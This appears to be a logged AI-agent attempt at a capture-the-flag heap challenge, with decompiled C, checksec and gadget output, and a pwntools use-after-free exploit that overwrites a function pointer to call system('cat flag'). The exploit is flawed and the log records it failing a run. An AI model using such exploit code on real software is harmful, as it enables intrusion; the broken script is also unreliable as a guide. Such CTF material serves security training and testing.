@@ -1,0 +1,296 @@
+{'documents': [],
+ 'error': 'yes',
+ 'generation': code(prefix='To solve this challenge, we can use the UAF (Use-After-Free) vulnerability in del_note() function. We will free a note and then create a new one at the same location to overwrite the function pointer print_note_content with the address of system(). Then, by calling print_note(), we can execute system("cat flag").', imports='from pwn import *\n', code='# Path to the binary\nbinary_path = "./pwn/heap/heap-1/heap1"\n\n# Start process\np = process(binary_path)\n\n# Find the offset for system()\nsystem_offset = p.libc.sym.system\nbin_sh_offset = next(p.libc.search(b\'/bin/sh\'))\n\n# Function to add note\ndef add_note(size, content):\n    p.sendlineafter(b\'Choice:\', b\'1\')\n    p.sendlineafter(b\'Note size :\', str(size).encode())\n    p.sendlineafter(b\'Content :\', content)\n\n# Function to delete note\ndef del_note(index):\n    p.sendlineafter(b\'Choice:\', b\'2\')\n    p.sendlineafter(b\'Index :\\n\', str(index).encode())\n\n# Function to print note\ndef print_note(index):\n    p.sendlineafter(b\'Choice:\', b\'3\')\n    p.sendlineafter(b\'Index :\\n\', str(index).encode())\n\n# Add two notes\nadd_note(24, b\'A\' * 24)\nadd_note(24, b\'B\' * 24)\n\n# Delete first note\ndel_note(0)\n\n# Overwrite function pointer with address of system()\npay = p32(system_offset) + b\'C\' * 20\nadd_note(24, pay)\n\n# Call print_note() to trigger system("cat flag")\nprint_note(0)\n\n# Get flag\nflag = p.recvline()\nlog.success(f"Flag: {flag.decode().strip()}")'),
+ 'info': 'Challenge is a ELF 32-bit LSB executable file and the file path is '
+         '"./pwn/heap/heap-1/heap1".\n'
+         '1.Here is the key function for exploit in the C file decompiled from '
+         'heap1:\n'
+         'unsigned int add_note()\n'
+         '{\n'
+         '  int v0; // ebx\n'
+         '  int i; // [esp+Ch] [ebp-1Ch]\n'
+         '  int size; // [esp+10h] [ebp-18h]\n'
+         '  char buf[8]; // [esp+14h] [ebp-14h] BYREF\n'
+         '  unsigned int v5; // [esp+1Ch] [ebp-Ch]\n'
+         '\n'
+         '  v5 = __readgsdword(0x14u);\n'
+         '  if ( count <= 5 )\n'
+         '  {\n'
+         '    for ( i = 0; i <= 4; ++i )\n'
+         '    {\n'
+         '      if ( !*(&notelist + i) )\n'
+         '      {\n'
+         '        *(&notelist + i) = malloc(8u);\n'
+         '        if ( !*(&notelist + i) )\n'
+         '        {\n'
+         '          puts("Alloca Error");\n'
+         '          exit(-1);\n'
+         '        }\n'
+         '        *(_DWORD *)*(&notelist + i) = print_note_content;\n'
+         '        printf("Note size :");\n'
+         '        read(0, buf, 8u);\n'
+         '        size = atoi(buf);\n'
+         '        v0 = (int)*(&notelist + i);\n'
+         '        *(_DWORD *)(v0 + 4) = malloc(size);\n'
+         '        if ( !*((_DWORD *)*(&notelist + i) + 1) )\n'
+         '        {\n'
+         '          puts("Alloca Error");\n'
+         '          exit(-1);\n'
+         '        }\n'
+         '        printf("Content :");\n'
+         '        read(0, *((void **)*(&notelist + i) + 1), size);\n'
+         '        puts("Success !");\n'
+         '        ++count;\n'
+         '        return __readgsdword(0x14u) ^ v5;\n'
+         '      }\n'
+         '    }\n'
+         '  }\n'
+         '  else\n'
+         '  {\n'
+         '    puts("Full");\n'
+         '  }\n'
+         '  return __readgsdword(0x14u) ^ v5;\n'
+         '}\n'
+         '\n'
+         '\n'
+         '\n'
+         'unsigned int del_note()\n'
+         '{\n'
+         '  int v1; // [esp+4h] [ebp-14h]\n'
+         '  char buf[4]; // [esp+8h] [ebp-10h] BYREF\n'
+         '  unsigned int v3; // [esp+Ch] [ebp-Ch]\n'
+         '\n'
+         '  v3 = __readgsdword(0x14u);\n'
+         '  printf("Index :\\n");\n'
+         '  read(0, buf, 4u);\n'
+         '  v1 = atoi(buf);\n'
+         '  if ( v1 < 0 || v1 >= count )\n'
+         '  {\n'
+         '    puts("Out of bound!");\n'
+         '    _exit(0);\n'
+         '  }\n'
+         '  if ( *(&notelist + v1) )\n'
+         '  {\n'
+         '    free(*((void **)*(&notelist + v1) + 1));\n'
+         '    free(*(&notelist + v1));\n'
+         '    puts("Success");\n'
+         '  }\n'
+         '  return __readgsdword(0x14u) ^ v3;\n'
+         '}\n'
+         '\n'
+         '\n'
+         '\n'
+         'unsigned int print_note()\n'
+         '{\n'
+         '  int v1; // [esp+4h] [ebp-14h]\n'
+         '  char buf[4]; // [esp+8h] [ebp-10h] BYREF\n'
+         '  unsigned int v3; // [esp+Ch] [ebp-Ch]\n'
+         '\n'
+         '  v3 = __readgsdword(0x14u);\n'
+         '  printf("Index :\\n");\n'
+         '  read(0, buf, 4u);\n'
+         '  v1 = atoi(buf);\n'
+         '  if ( v1 < 0 || v1 >= count )\n'
+         '  {\n'
+         '    puts("Out of bound!");\n'
+         '    _exit(0);\n'
+         '  }\n'
+         '  if ( *(&notelist + v1) )\n'
+         '    (*(void (__cdecl **)(_DWORD))*(&notelist + v1))(*(&notelist + '
+         'v1));\n'
+         '  return __readgsdword(0x14u) ^ v3;\n'
+         '}\n'
+         '\n'
+         '\n'
+         '\n'
+         'int magic()\n'
+         '{\n'
+         '  return system("cat flag");\n'
+         '}\n'
+         '\n'
+         '\n'
+         '\n'
+         'int __cdecl __noreturn main(int argc, const char **argv, const char '
+         '**envp)\n'
+         '{\n'
+         '  int v3; // eax\n'
+         '  char buf[4]; // [esp+8h] [ebp-10h] BYREF\n'
+         '  unsigned int v5; // [esp+Ch] [ebp-Ch]\n'
+         '\n'
+         '  v5 = __readgsdword(0x14u);\n'
+         '  setvbuf(stdout, 0, 2, 0);\n'
+         '  setvbuf(stdin, 0, 2, 0);\n'
+         '  while ( 1 )\n'
+         '  {\n'
+         '    while ( 1 )\n'
+         '    {\n'
+         '      menu();\n'
+         '      read(0, buf, 4u);\n'
+         '      v3 = atoi(buf);\n'
+         '      if ( v3 != 2 )\n'
+         '        break;\n'
+         '      del_note();\n'
+         '    }\n'
+         '    if ( v3 > 2 )\n'
+         '    {\n'
+         '      if ( v3 == 3 )\n'
+         '      {\n'
+         '        print_note();\n'
+         '      }\n'
+         '      else\n'
+         '      {\n'
+         '        if ( v3 == 4 )\n'
+         '          exit(0);\n'
+         'LABEL_13:\n'
+         '        puts("Invalid choice");\n'
+         '      }\n'
+         '    }\n'
+         '    else\n'
+         '    {\n'
+         '      if ( v3 != 1 )\n'
+         '        goto LABEL_13;\n'
+         '      add_note();\n'
+         '    }\n'
+         '  }\n'
+         '}\n'
+         '\n'
+         "2.Here is the file security infomation identified by 'checksec' "
+         'command:\n'
+         '{"relro": "partial", "canary": "yes", "nx": "yes", "pie": "no", '
+         '"rpath": "no", "runpath": "no", "symbols": "yes", "fortify_source": '
+         '"no", "fortified": "0", "fortify-able": "2"}\n'
+         '\n'
+         '3.We use ROPgadget to search gadgets on heap1:\n'
+         'Gadgets information\n'
+         '============================================================\n'
+         '0x08048b5b : pop ebp ; ret\n'
+         '0x08048b58 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret\n'
+         '0x08048479 : pop ebx ; ret\n'
+         '0x08048b5a : pop edi ; pop ebp ; ret\n'
+         '0x08048b59 : pop esi ; pop edi ; pop ebp ; ret\n'
+         '0x08048462 : ret\n'
+         '0x080486d3 : ret 0x458b\n'
+         '0x080485de : ret 0xeac1\n'
+         '\n'
+         'Unique gadgets found: 8\n'
+         '\n'
+         "4.Here is information of the file's relocation section:\n"
+         "Relocation section '.rel.plt' at offset 0x3f8 contains 12 entries:\n"
+         ' Offset     Info    Type            Sym.Value  Sym. Name\n'
+         '0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0\n'
+         '0804a010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0\n'
+         '0804a014  00000307 R_386_JUMP_SLOT   00000000   _exit@GLIBC_2.0\n'
+         '0804a018  00000407 R_386_JUMP_SLOT   00000000   free@GLIBC_2.0\n'
+         '0804a01c  00000507 R_386_JUMP_SLOT   00000000   '
+         '__stack_chk_fail@GLIBC_2.4\n'
+         '0804a020  00000607 R_386_JUMP_SLOT   00000000   malloc@GLIBC_2.0\n'
+         '0804a024  00000707 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0\n'
+         '0804a028  00000807 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0\n'
+         '0804a02c  00000a07 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0\n'
+         '0804a030  00000b07 R_386_JUMP_SLOT   00000000   '
+         '__libc_start_main@GLIBC_2.0\n'
+         '0804a034  00000c07 R_386_JUMP_SLOT   00000000   setvbuf@GLIBC_2.0\n'
+         '0804a038  00000d07 R_386_JUMP_SLOT   00000000   atoi@GLIBC_2.0\n'
+         '\n',
+ 'iterations': 1,
+ 'messages': [('user', 'How do I use pwntool to solve this challange?'),
+              ('assistant',
+               'To solve this challenge, we can use the UAF (Use-After-Free) '
+               'vulnerability in del_note() function. We will free a note and '
+               'then create a new one at the same location to overwrite the '
+               'function pointer print_note_content with the address of '
+               'system(). Then, by calling print_note(), we can execute '
+               'system("cat flag"). \n'
+               ' Imports: from pwn import *\n'
+               ' \n'
+               ' Code: # Path to the binary\n'
+               'binary_path = "./pwn/heap/heap-1/heap1"\n'
+               '\n'
+               '# Start process\n'
+               'p = process(binary_path)\n'
+               '\n'
+               '# Find the offset for system()\n'
+               'system_offset = p.libc.sym.system\n'
+               "bin_sh_offset = next(p.libc.search(b'/bin/sh'))\n"
+               '\n'
+               '# Function to add note\n'
+               'def add_note(size, content):\n'
+               "    p.sendlineafter(b'Choice:', b'1')\n"
+               "    p.sendlineafter(b'Note size :', str(size).encode())\n"
+               "    p.sendlineafter(b'Content :', content)\n"
+               '\n'
+               '# Function to delete note\n'
+               'def del_note(index):\n'
+               "    p.sendlineafter(b'Choice:', b'2')\n"
+               "    p.sendlineafter(b'Index :\\n', str(index).encode())\n"
+               '\n'
+               '# Function to print note\n'
+               'def print_note(index):\n'
+               "    p.sendlineafter(b'Choice:', b'3')\n"
+               "    p.sendlineafter(b'Index :\\n', str(index).encode())\n"
+               '\n'
+               '# Add two notes\n'
+               "add_note(24, b'A' * 24)\n"
+               "add_note(24, b'B' * 24)\n"
+               '\n'
+               '# Delete first note\n'
+               'del_note(0)\n'
+               '\n'
+               '# Overwrite function pointer with address of system()\n'
+               "pay = p32(system_offset) + b'C' * 20\n"
+               'add_note(24, pay)\n'
+               '\n'
+               '# Call print_note() to trigger system("cat flag")\n'
+               'print_note(0)\n'
+               '\n'
+               '# Get flag\n'
+               'flag = p.recvline()\n'
+               'log.success(f"Flag: {flag.decode().strip()}")'),
+              ('user',
+               "Your solution failed the code execution test: 'str' object has "
+               "no attribute 'decode'")]}
+from pwn import *
+
+# Path to the binary
+binary_path = "./pwn/heap/heap-1/heap1"
+
+# Start process
+p = process(binary_path)
+
+# Find the offset for system()
+system_offset = p.libc.sym.system
+bin_sh_offset = next(p.libc.search(b'/bin/sh'))
+
+# Function to add note
+def add_note(size, content):
+    p.sendlineafter(b'Choice:', b'1')
+    p.sendlineafter(b'Note size :', str(size).encode())
+    p.sendlineafter(b'Content :', content)
+
+# Function to delete note
+def del_note(index):
+    p.sendlineafter(b'Choice:', b'2')
+    p.sendlineafter(b'Index :\n', str(index).encode())
+
+# Function to print note
+def print_note(index):
+    p.sendlineafter(b'Choice:', b'3')
+    p.sendlineafter(b'Index :\n', str(index).encode())
+
+# Add two notes
+add_note(24, b'A' * 24)
+add_note(24, b'B' * 24)
+
+# Delete first note
+del_note(0)
+
+# Overwrite function pointer with address of system()
+pay = p32(system_offset) + b'C' * 20
+add_note(24, pay)
+
+# Call print_note() to trigger system("cat flag")
+print_note(0)
+
+# Get flag
+flag = p.recvline()
+log.success(f"Flag: {flag.decode().strip()}")
